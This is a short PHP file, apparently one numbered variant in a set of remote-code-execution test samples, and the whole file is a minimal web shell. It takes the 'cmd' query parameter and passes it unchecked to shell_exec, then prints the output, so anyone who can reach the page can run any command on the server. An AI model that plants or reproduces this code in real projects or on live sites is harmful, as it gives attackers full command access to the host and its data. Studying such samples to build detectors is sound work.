<?php
// RCE test variation #832
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>